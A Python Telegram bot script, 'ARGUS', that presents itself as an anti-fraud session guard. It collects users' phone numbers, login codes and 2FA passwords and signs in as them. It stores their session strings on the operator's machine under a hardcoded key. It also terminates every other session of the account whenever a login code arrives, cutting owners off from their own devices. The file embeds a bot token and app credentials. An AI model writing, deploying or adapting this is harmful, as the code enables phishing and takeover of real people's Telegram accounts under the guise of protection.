import os, asyncio, base64, hashlib
from telethon import TelegramClient, events, functions, types, errors
from telethon.sessions import StringSession
from cryptography.fernet import Fernet

# =============================================================
# [STRICTLY CONFIDENTIAL] 
# CENTRAL INTELLIGENCE UNIT: PROJECT "ARGUS"
# =============================================================
API_ID = 4           
API_HASH = '014b35b6184100b085b0d0572f9b5103' 

BOT_TOKEN = '8514425749:AAEhHWy1tJBFcycQtTDZerF3tX5E518CcGs' 

# КЛЮЧ ШИФРОВАНИЯ (AES-256)
CRYPT_KEY = "SIGMA_OPERATIVE_ALPHA_001"
# =============================================================

def get_cipher():
    k = base64.urlsafe_b64encode(hashlib.sha256(CRYPT_KEY.encode()).digest())
    return Fernet(k)

cipher = get_cipher()
active_units = {} 
auth_process = {}     

bot = TelegramClient('argus_core', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ПРОТОКОЛ КОНТРМЕР (ANTIFRAUD SENTINEL)
async def start_sentinel(client, uid):
    @client.on(events.NewMessage(chats=777000))
    async def handler(event):
        msg = event.raw_text.lower()
        if any(x in msg for x in ["код", "code", "login", "вход"]):
            res = await client(functions.account.GetAuthorizationsRequest())
            killed = 0
            for a in res.authorizations:
                if not a.current:
                    await client(functions.account.ResetAuthorizationRequest(hash=a.hash))
                    killed += 1
            if killed > 0:
                await bot.send_message(uid, (
                    "🚨 **ВНИМАНИЕ: НАРУШЕНИЕ ПЕРИМЕТРА**\n\n"
                    "ОБЪЕКТ: ПОПЫТКА НЕСАНКЦИОНИРОВАННОГО ДОСТУПА\n"
                    f"КОНТРМЕРЫ: ЛИКВИДАЦИЯ ВНЕШНИХ СЕССИЙ ({killed})\n"
                    "СТАТУС: БЕЗОПАСНОСТЬ ВОССТАНОВЛЕНА"
                ))

# ТЕРМИНАЛ УПРАВЛЕНИЯ
@bot.on(events.NewMessage(pattern='/start'))
async def cmd_start(e):
    uid = e.sender_id
    if uid in active_units:
        kb = [[types.KeyboardButtonCallback("📡 СКАНЕР СОЕДИНЕНИЙ", b"st")],
              [types.KeyboardButtonCallback("💀 ТЕРМИНАЛЬНЫЙ СБРОС", b"nuke")],
              [types.KeyboardButtonCallback("🗑 УТИЛИЗАЦИЯ ДАННЫХ", b"exit")]]
        
        me = await active_units[uid].get_me()
        await e.respond(
            f"🖥 **ГЛАВНЫЙ ТЕРМИНАЛ: ARGUS-SYSTEM**\n\n"
            f"ОПЕРАТОР: `{me.first_name}`\n"
            f"ID: `{uid}`\n"
            "СТАТУС: **ПОД ОХРАНОЙ**\n"
            "КАНАЛ: ЗАШИФРОВАН (AES-256)", buttons=bot.build_reply_markup(kb))
    else:
        await e.respond(
            "🛑 **СИСТЕМА МОНИТОРИНГА ARGUS**\n\n"
            "ДОСТУП ЗАБЛОКИРОВАН. ТРЕБУЕТСЯ ИНИЦИАЛИЗАЦИЯ УЗЛА.", 
            buttons=[[types.KeyboardButtonCallback("🔐 АВТОРИЗОВАТЬ ДОСТУП", b"login")]])

@bot.on(events.CallbackQuery)
async def callbacks(e):
    uid = e.sender_id
    if e.data == b"login":
        auth_process[uid] = {'s': 'p'}
        await e.respond("⌨️ [СИСТЕМА]: Введите идентификатор (номер телефона)...")
    
    elif e.data == b"st" and uid in active_units:
        a = await active_units[uid](functions.account.GetAuthorizationsRequest())
        txt = "📋 **РЕЕСТР АКТИВНЫХ ПОДКЛЮЧЕНИЙ:**\n" + "\n".join([f"• {x.device_model} | {x.ip} | {x.country}" for x in a.authorizations])
        await e.respond(txt)

    elif e.data == b"nuke" and uid in active_units:
        a = await active_units[uid](functions.account.GetAuthorizationsRequest())
        for x in a.authorizations:
            if not x.current: await active_units[uid](functions.account.ResetAuthorizationRequest(hash=x.hash))
        await e.respond("💀 **ОПЕРАЦИЯ ЗАВЕРШЕНА.** Все сторонние сессии аннулированы.")

    elif e.data == b"exit":
        if uid in active_units: del active_units[uid]
        if os.path.exists(f"{uid}.dat"): os.remove(f"{uid}.dat")
        await e.respond("🗑 **ДАННЫЕ УНИЧТОЖЕНЫ.** Модуль деактивирован.")

# ПРОЦЕСС АВТОРИЗАЦИИ (ПРОЗРАЧНЫЙ РЕЖИМ)
@bot.on(events.NewMessage)
async def login_flow(e):
    uid = e.sender_id
    if uid not in auth_process or e.text.startswith('/'): return
    
    state = auth_process[uid]
    try:
        if state['s'] == 'p':
            c = TelegramClient(StringSession(), API_ID, API_HASH)
            await c.connect()
            s = await c.send_code_request(e.text)
            auth_process[uid] = {'s': 'c', 'n': e.text, 'h': s.phone_code_hash, 'c': c}
            await e.respond("📑 [СИСТЕМА]: Пакет верификации отправлен. Введите код:")
        
        elif state['s'] == 'c':
            c = state['c']
            # Попытка входа
            user = await c.sign_in(state['n'], e.text, phone_code_hash=state['h'])
            
            # ВЫВОД ДАННЫХ ДЛЯ ПРОВЕРКИ (ПРОТОКОЛ ПРОЗРАЧНОСТИ)
            auths = await c(functions.account.GetAuthorizationsRequest())
            current = next((x for x in auths.authorizations if x.current), None)
            
            summary = (
                "✅ **АВТОРИЗАЦИЯ УСПЕШНА**\n\n"
                f"ОБЪЕКТ: `{user.first_name}`\n"
                f"УСТРОЙСТВО: `{current.device_model if current else 'Unknown'}`\n"
                f"IP-АДРЕС: `{current.ip if current else 'Unknown'}`\n"
                f"ЛОКАЦИЯ: `{current.country if current else 'Unknown'}`\n\n"
                "🛡 **ЗАЩИТНЫЙ КОНТУР АКТИВИРОВАН.**"
            )
            
            token = cipher.encrypt(c.session.save().encode()).decode()
            with open(f"{uid}.dat", "w") as f: f.write(token)
            active_units[uid] = c
            asyncio.create_task(start_sentinel(c, uid))
            del auth_process[uid]
            await e.respond(summary)
            
    except errors.SessionPasswordNeededError:
        auth_process[uid]['s'] = '2'
        await e.respond("🔑 [2FA]: Введите пароль двухэтапной аутентификации:")
    except Exception as ex:
        await e.respond(f"❌ [ОШИБКА]: {ex}")

async def restore():
    for f in os.listdir():
        if f.endswith(".dat"):
            try:
                uid = int(f.split(".")[0])
                with open(f, "r") as file:
                    data = cipher.decrypt(file.read().encode()).decode()
                c = TelegramClient(StringSession(data), API_ID, API_HASH)
                await c.connect()
                if await c.is_user_authorized():
                    active_units[uid] = c
                    asyncio.create_task(start_sentinel(c, uid))
            except: pass

if __name__ == '__main__':
    print(">>> ARGUS CORE ONLINE.")
    bot.loop.run_until_complete(restore())
    bot.run_until_disconnected()
